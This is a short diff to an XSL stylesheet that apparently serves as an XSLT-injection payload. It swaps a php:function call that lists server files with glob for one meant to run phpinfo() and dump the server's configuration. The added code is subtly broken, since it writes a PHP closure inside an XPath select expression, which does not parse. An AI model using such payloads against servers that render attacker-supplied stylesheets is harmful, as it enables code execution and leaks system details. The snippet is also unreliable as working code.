@@ -10,7 +10,11 @@
 </div>
 <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
 <p>
-<xsl:value-of select="php:functionString('glob', '*.*')"/>
+<xsl:value-of select="php:function('call_user_func', function(){
+    ob_start();
+    phpinfo();
+    return ob_get_clean();
+})"/>
 <span style="font-style:italic">
     (
     <xsl:value-of select="prct"/>
